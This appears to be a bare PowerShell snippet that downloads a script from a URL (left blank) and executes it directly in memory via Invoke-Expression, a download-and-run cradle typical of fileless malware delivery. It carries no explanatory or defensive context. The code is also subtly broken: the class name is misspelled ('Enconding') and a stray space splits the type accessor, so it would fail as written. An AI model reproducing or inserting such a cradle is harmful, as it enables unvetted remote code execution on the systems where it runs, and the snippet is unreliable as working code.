# URL of the script to download
$scriptUrl = ""

# Download thr script Content
$scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0
$scriptContent = [System.Text.Enconding] ::UTF8.GetString($scriptBytes.Content)

# Execute the script in memory
Invoke-Expression -Command $scriptContent
